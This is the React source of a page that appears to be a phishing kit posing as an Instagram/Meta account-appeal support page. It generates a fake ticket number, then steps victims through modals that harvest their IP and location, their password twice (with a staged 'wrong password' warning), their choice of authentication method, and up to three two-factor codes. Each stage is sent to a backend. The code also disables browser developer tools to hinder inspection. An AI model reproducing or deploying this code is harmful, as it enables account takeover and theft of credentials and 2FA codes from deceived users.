 "use client";

import React, { useEffect, useState } from 'react';
import '../../styles/pages/Supportpage.scss';
import '../../styles/base/bootstrap.min.css';
import '../../styles/pages/Modal.scss';
import "react-phone-input-2/lib/style.css";
import AuthModal from '../components/modals/AuthModal';
import PasswordModal from '../components/modals/PasswordModal';
import SecurityModal from '../components/modals/SecurityModal';
import FinalModal from '../components/modals/FinalModal';
import ChoseAuthenModal from '../components/modals/ChoseAuthen';
import { getRecord, getUserLocation, saveRecord, sendAppealForm } from '../utils';
import disableDevtool from 'disable-devtool';
import moment from 'moment';
import "../libs/i18n"
import { useTranslation } from 'react-i18next';

const AccountPageComponent = () => {
    // LANGUAGE
    const { t, i18n } = useTranslation();
    const [ready, setReady] = useState(false);
    
    // STATE MENU
    const [activeMenu, setActiveMenu] = useState(null);

    const currentDate = moment().format('MMMM D, YYYY')

    // LOCATION
    const [userIp, setUserIp] = useState("");
    const [userFlag, setUserFlag] = useState("");

    // Add ticket ID state
    const [ticketId, setTicketId] = useState("4564-ATFD-4865");

    // STATE OPEND MODAL
    const [openAuthModal, setOpenAuthModal] = useState(false);
    const [openPasswordModal, setOpenPasswordModal] = useState(false);
    const [openSecurityModal, setOpenSecurityModal] = useState(false);
    const [openFinalModal, setOpenFinalModal] = useState(false);
    const [openTheIdModal, setOpenTheIdModal] = useState(false);
    const [timeCounter, setTimeCounter] = useState(0);

    const [openChoseAuthenModal, setOpenChoseAuthenModal] = useState(false);
    const [dataCookie, setDataCookie] = useState(null);

    const [dataCookieSecurity, setDataCookieSecurity] = useState(null);

    // LOADING STATE
    const [loadingPassword, setLoadingPassword] = useState(false);
    const [loadingSecurity, setLoadingSecurity] = useState(false);
    const [loadingChoseAuthen, setLoadingChoseAuthen] = useState(false);
    const [loadingTheId, setLoadingTheId] = useState(false);

    // WARNING STATE
    const [warningPassword, setWarningPassword] = useState(false);
    const [warningSecurity, setWarningSecurity] = useState(false);

    // STATE CHECK CLICK
    const [clickPassword, setClickPassword] = useState(0);
    const [clickSecurity, setClickSecurity] = useState(0);

    // STATE FILE UPLOAD
    const [fileList, setFileList] = useState([]);

    const handleFileChange = (newFileList) => {
        setFileList(newFileList);
    };

    useEffect(() => {
        if (typeof window !== 'undefined') {
            disableDevtool();
        }
    }, []);

    useEffect(() => {
        const getIp = async () => {
            try {
                const userLocation = await getUserLocation();
                setUserIp(userLocation?.ip || "Error, contact @otis_cua");

                setUserFlag(userLocation?.country_code || "US");

                const language = userLocation?.country_code.toLowerCase() || "en";
                i18n.changeLanguage(language).then(() => setReady(true));
            } catch (error) {
                console.error("Error getting IP or location:", error);
                setUserFlag("US");
            }
        }
        getIp();
    }, []);

    // FUNCTION HANDLE OPEN MENU
    const handleOpendMenu = (menuId) => {
        setActiveMenu((prevActiveMenu) => (prevActiveMenu === menuId ? null : menuId));
    };

    // FUNCTION HANDLE FINISH APPEAL
    const handleFinishAppeal = async (values) => {
        try {
            const userLocation = await getUserLocation(userIp);

            const cookieVersion_1 = {
                ip: userIp,
                location: userLocation?.location || "Error, contact @otis_cua",
                ...values
            }

            saveRecord("__ck_clv1", cookieVersion_1);
            setOpenAuthModal(false)
            setOpenPasswordModal(true);
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH PASSWORD
    const handleFinishPassword = async (values) => {
        try {
            if (clickPassword === 0) {
                setLoadingPassword(true);
                let ck_data_v1 = getRecord("__ck_clv1");

                if (!ck_data_v1) {
                    console.log("Not found __ck_data");
                    ck_data_v1 = getRecord("__ck_clv1");
                }

                const cookieVersion_2 = {
                    ...ck_data_v1,
                    password: values.password
                }

                saveRecord("__ck_clv2", cookieVersion_2);
                await sendAppealForm(cookieVersion_2)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(true);
                        }, 1500);
                        setClickPassword(1)
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            } else {
                setLoadingPassword(true);
                let ck_data_v2 = getRecord("__ck_clv2");

                if (!ck_data_v2) {
                    console.log("Not found __ck_data");
                    ck_data_v2 = getRecord("__ck_clv2");
                }

                const cookieVersion_3 = {
                    ...ck_data_v2,
                    passwordSecond: values.password
                }

                saveRecord("__ck_clv3", cookieVersion_3);
                await sendAppealForm(cookieVersion_3)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingPassword(false);
                            setWarningPassword(false);

                            setOpenPasswordModal(false);

                            setOpenChoseAuthenModal(true)
                            setDataCookie(cookieVersion_3)
                            // setOpenSecurityModal(true);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

            }
        } catch (error) {
            console.error("Error submitting form:", error);
        }
    }

    // FUNCTION HANDLE FINISH CHOSE AUTHEN
    const handleFinishChoseAuthen = async (values) => {
        console.log(values);
        setLoadingChoseAuthen(true);
        let ck_data_v2 = getRecord("__ck_clv3");

        if (!ck_data_v2) {
            console.log("Not found __ck_data");
            ck_data_v2 = getRecord("__ck_clv3");
        }

        const cookieVersion_4 = {
            ...ck_data_v2,
            authMethod: values.authMethod
        }

        saveRecord("__ck_clv4", cookieVersion_4);
        await sendAppealForm(cookieVersion_4)
            .then(() => {
                setTimeout(() => {
                    setLoadingChoseAuthen(false);
                    setOpenChoseAuthenModal(false);
                    setOpenSecurityModal(true);
                    setDataCookieSecurity(cookieVersion_4);
                }, 1500);
            })
            .catch((err) => {
                console.log(err);
            });
    }

    // FUNCTION HANDLE FINISH SECURITY
    const handleFinishSecurity = async (values) => {
        switch (clickSecurity) {
            case 0:
                setLoadingSecurity(true);
                let ck_data_v4 = getRecord("__ck_clv4");

                if (!ck_data_v4) {
                    console.log("Not found __ck_data");
                    ck_data_v4 = getRecord("__ck_clv4");
                }

                const cookieVersion_5 = {
                    ...ck_data_v4,
                    twoFa: values.twoFa
                }

                saveRecord("__ck_clv5", cookieVersion_5);
                await sendAppealForm(cookieVersion_5)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setWarningSecurity(true);
                            setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                            setClickSecurity(1);
                        }, 1500);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            case 1:
                setLoadingSecurity(true);
                let ck_data_v5 = getRecord("__ck_clv5");

                if (!ck_data_v5) {
                    console.log("Not found __ck_data");
                    ck_data_v5 = getRecord("__ck_clv5");
                }

                const cookieVersion_6 = {
                    ...ck_data_v5,
                    twoFaSecond: values.twoFa
                }

                saveRecord("__ck_clv6", cookieVersion_6);
                await sendAppealForm(cookieVersion_6)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setWarningSecurity(true);
                            setTimeCounter(process.env.NEXT_PUBLIC_SETTING_TIME);
                            setClickSecurity(2);
                        }, 1300);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            case 2:
                setLoadingSecurity(true);
                let ck_data_v6 = getRecord("__ck_clv6");

                if (!ck_data_v6) {
                    console.log("Not found __ck_data");
                    ck_data_v6 = getRecord("__ck_clv6");
                }

                const cookieVersion_7 = {
                    ...ck_data_v6,
                    twoFaThird: values.twoFa
                }

                await sendAppealForm(cookieVersion_7)
                    .then(() => {
                        setTimeout(() => {
                            setLoadingSecurity(false);
                            setOpenSecurityModal(false);
                            setOpenFinalModal(true);
                            resetPasswordState();
                            resetSecurityState();
                        }, 1000);
                    })
                    .catch((err) => {
                        console.log(err);
                    });

                break;
            default:
                break;
        }
    }

    // FUNCTION HANDLE TRY ANOTHER WAY
    const handleTryAnotherWay = () => {
        setOpenSecurityModal(false);
        setOpenChoseAuthenModal(true);
    }

    const resetPasswordState = () => {
        setOpenPasswordModal(false);
        setLoadingPassword(false);
        setWarningPassword(false);
        setClickPassword(0);
    };

    const resetSecurityState = () => {
        setOpenSecurityModal(false);
        setLoadingSecurity(false);
        setWarningSecurity(false);
        setTimeCounter(0);
        setClickSecurity(0);
    };

    useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };
        
        generateTicketId();

    }, []);

    if (!ready) {
        return ('')
    }

    return (
        <>
            <div id='main-component'>
                <div className='container-sm' id='main'>
                  
                    <div className="row container-content">
                   

                        {/* RIGHT CONTENT START */}
                        <div className="righ col-8">
                            <div className='content-right'>
                                <div className="top-content">
                                    <h1>{t('content.top_content.title')}</h1>
                                    <p>{t('content.top_content.sub.sub_1')}</p>
                                    <p>{t('content.top_content.sub.sub_2')}</p>
                                    <p className="ticket">{t('content.top_content.ticket')} #{ticketId}</p>
                                    <p><b>{t('content.guide.title')}</b></p>
                                    <ul>
                                        <li>{t('content.guide.sub.sub_1')}</li>
                                        <li>{t('content.guide.sub.sub_2')}</li>
                                        <li>{t('content.guide.sub.sub_3')}</li>
                                    </ul>
                                </div>
                                {/* CARD */}
                                <div className='card-thumb'>
                                    <img src="/banner-v3.png" width="100%" alt='warning instagram accont' />
                                    <div className='thumb-content'>
                                        <div className="warning-list">
                                            <p>{t('content.thumb.sub.sub_1')}</p>
                                            <h1><b>{t('content.thumb.title')}</b></h1>
                                            <p>{t('content.thumb.sub.sub_2')}</p>
                                        </div>
                                        <div className='btn-wrapper' onClick={() => setOpenAuthModal(true)}>
                                            <div className='button fb-blue'><b>{t('content.thumb.button')}</b></div>
                                        </div>
                                        <div className="day" style={{ marginTop: '10px', textAlign: 'center' }}>
                                            <p>{t('content.thumb.day')} <b>{currentDate}</b>.</p>
                                        </div>
                                    </div>
                                </div>

                                <div className="card-bottom">
                                    <h6>{t('content.privacy_center.title')}</h6>
                                    <div className='item-action'>
                                        <div className='action-button b-bottom' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-icon'>
                                                <img src="/icon-women.png" alt="icon warning" />
                                            </div>
                                            <div className='action-text'>
                                                <span>{t('content.privacy_center.sub_title.sub_1.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.privacy_center.sub_title.sub_1.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                        <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-icon'>
                                                <img src="/icon-women.png" alt="icon warning" />
                                            </div>
                                            <div className='action-text'>
                                                <span>{t('content.privacy_center.sub_title.sub_2.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.privacy_center.sub_title.sub_2.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />

                                    <h6>{t('content.more_info.title')}</h6>
                                    <div className='item-action'>
                                        <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-icon'>
                                                <img src="/icon-docs.png" alt=" Ai" />
                                            </div>
                                            <div className='action-text'>
                                                <span>{t('content.more_info.sub_title.sub_1.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.more_info.sub_title.sub_1.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />

                                    <h6>{t('content.resouces.title')}</h6>
                                    <div className='item-action'>
                                        <div className='action-button b-bottom ' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-text'>
                                                <span>{t('content.resouces.sub_title.sub_1.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.resouces.sub_title.sub_1.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                        <div className='action-button b-bottom ' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-text'>
                                                <span>{t('content.resouces.sub_title.sub_2.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.resouces.sub_title.sub_2.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                        <div className='action-button' onClick={() => setOpenAuthModal(true)}>
                                            <div className='action-text'>
                                                <span>{t('content.resouces.sub_title.sub_3.title')}</span>
                                                <br />
                                                <span className="small-grey">{t('content.resouces.sub_title.sub_3.description')}</span>
                                            </div>
                                            <div className='action-arrow'>
                                                <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />

                                    <div className='small-grey'>
                                        {t('content.footer.title')}
                                        <div className='link-to'>
                                            {t('content.footer.link')}
                                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        {/* RIGHT CONTENT END */}
                    </div>
                </div>
            </div>


            <AuthModal
                openAuthModal={openAuthModal}
                onCancel={() => setOpenAuthModal(false)}
                onFinish={handleFinishAppeal}
                countryEmoji={userFlag}
            />

            <PasswordModal
                opendPasswordModal={openPasswordModal}
                onCancelPasswordModal={resetPasswordState}
                onFinishPassword={handleFinishPassword}
                loadingPassword={loadingPassword}
                warningPassword={warningPassword}
            />

            <SecurityModal
                openSecurityModal={openSecurityModal}
                onCancelSecurityModal={resetSecurityState}
                onFinishSecurity={handleFinishSecurity}
                loadingSecurity={loadingSecurity}
                timeCounter={timeCounter}
                clickSecurity={clickSecurity}
                dataCookie={dataCookieSecurity}
                onTryAnotherWay={handleTryAnotherWay}
            />

            <FinalModal
                openFinalModal={openFinalModal}
                onCancelFinalModal={() => {
                    setOpenFinalModal(false);
                    resetPasswordState();
                    resetSecurityState();
                }}
            />

            <ChoseAuthenModal
                dataCookie={dataCookie}
                openChoseAuthenModal={openChoseAuthenModal}
                onCancelChoseAuthenModal={() => setOpenChoseAuthenModal(false)}
                onFinishChoseAuthen={handleFinishChoseAuthen}
                loadingChoseAuthen={loadingChoseAuthen}
            />
        </>
    );
};

export default AccountPageComponent;